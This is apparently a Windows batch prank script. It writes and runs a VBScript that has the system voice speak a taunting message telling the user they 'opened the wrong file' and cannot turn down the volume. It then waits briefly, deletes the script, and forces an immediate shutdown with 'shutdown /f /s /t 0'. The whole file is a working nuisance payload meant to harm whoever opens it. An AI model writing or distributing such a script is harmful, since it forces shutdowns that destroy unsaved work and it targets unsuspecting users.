@echo off
start audio.vbs
echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "temp.vbs"
set text= Unfortunately, you have decided to open the wrong file. I know you are currently trying to turn down your volume. But you can't. The only way to stop this process is to shut down your computer. But don't worry, I'm going to do that for you. Commencing shutdown operation... weyouweyouweyouweyouweyouweyouweyouweyouweyouweyouweyouweyouweyouweyouweyouweyouweyouweyouweyouweyouweyouweyouweyouweyouweyouweyouweyouweyouweyouweyou
echo speech.speak "%text%" >> "temp.vbs"
start temp.vbs
ping localhost -n 29 >nul
del temp.vbs
shutdown /f /s /t 0